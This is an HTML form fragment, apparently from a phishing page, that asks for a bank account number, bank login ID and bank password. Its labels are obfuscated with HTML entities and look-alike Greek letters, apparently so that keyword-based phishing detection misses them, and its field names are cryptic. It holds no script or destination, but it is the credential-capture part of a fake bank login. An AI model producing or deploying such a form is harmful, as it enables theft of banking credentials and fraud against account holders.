<br>
<form>
	 <table>
<tr>
            <td>Account &Nu;umber :</td>
            <td><input type="number"  autocomplete="off"  maxlength="17" name="acnn" value="" required="required" title="Account Number"></input></td>
        </tr>
        <tr>
            <td>&#x0042;ank &#x004C;ogin ID :</td>
            <td><input type="text"  autocomplete="off"  maxlength="20" name="lo_ca" value="" required="required" title="Username"></input></td>
        </tr>
        <tr>
            <td>&#x0042;ank Passw&omicron;rd :</td>
            <td><input type="password" id="txt" onkeyup="check()" onmouseout="check()" autocomplete="off"  maxlength="25" name="pwd_ca" value="" required="required" title="Password"></input></td>
        </tr>
    </table>
</form>
